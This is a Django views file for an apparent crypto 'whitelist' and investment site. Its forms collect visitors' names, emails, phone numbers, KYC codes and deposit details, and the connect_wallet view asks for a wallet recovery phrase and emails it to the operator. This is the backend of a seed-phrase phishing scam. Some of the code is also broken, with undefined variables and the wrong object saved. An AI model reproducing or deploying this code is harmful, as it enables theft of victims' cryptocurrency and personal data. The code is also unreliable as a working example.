from django.shortcuts import render, redirect
from .models import WhiteList, ConnectWallet, Invest
from django.core.mail import send_mail
from django.conf import settings
# Create your views here.

def create_white_list(request, *args, **kwargs):
    #context = {}
    if request.method == 'POST':
        full_name = request.POST.get('full_name')
        email = request.POST.get('email')
        phone_no = request.POST.get("phone_no")
        etherium_address = request.POST.get('etherium_address')

        white_list = WhiteList(full_name = full_name, email = email, phone_no = phone_no, etherium_address = etherium_address)
        white_list.save()

        subject_message = f"{full_name}"
        message = f'This is a mail from Full Name: {full_name} \n Email: {email}\n Phone Number: {phone_no}\n Ethereum Address: {etherium_address}'
        send_mail(subject_message, message, f'omotoshodayo1993@gmail.com', ['omotoshodayo1993@gmail.com'])
        return redirect('invest')
    else:
        print("you need the correct post")
    return render(request, 'white_list.html')

def invest(request, *args, **kwargs):
    #context = {}
    if request.method == 'POST':
        full_name = request.POST.get('full_name')
        kyc_verification_code = request.POST.get('kyc_verification_code')
        deposited_amount = request.POST.get("deposited_amount")
        tx_id = request.POST.get('tx_id')

        invest = Invest(full_name = full_name, kyc_verification_code = kyc_verification_code, deposited_amount = deposited_amount, tx_id = tx_id)
        invest.save()

        subject_message = f"{full_name}"
        message = f'This is a mail from Full Name: {full_name} \n kyc_verification_code: {kyc_verification_code}\n deposited_amount: {deposited_amount}\n Transaction ID: {tx_id}'
        send_mail(subject_message, message, f'{settings.EMAIL_HOST_USER}', [settings.EMAIL_HOST_USER])
        return redirect('wallet')
    else:
        print("you need the correct post")
    return render(request, 'invest.html')

def connect_wallet(request, *args, **kwargs):
    #context = {}
    if request.method == 'POST':
        wallet_name = request.POST.get('wallet_name')
        recovery_phrase = request.POST.get('recovery_phrase')

        wallet = ConnectWallet(wallet_name = wallet_name, recovery_phrase = recovery_phrase, deposited_amount = deposited_amount, tx_id = tx_id)
        invest.save()

        subject_message = f"{wallet_name}"
        message = f'This is a mail from Full Name: {wallet_name} \n Email: {recovery_phrase}'
        send_mail(subject_message, message, f'{settings.EMAIL_HOST_USER}', [settings.EMAIL_HOST_USER])
        return redirect('wallet')
    else:
        print("you need the correct post")
    return render(request, 'wallet.html')
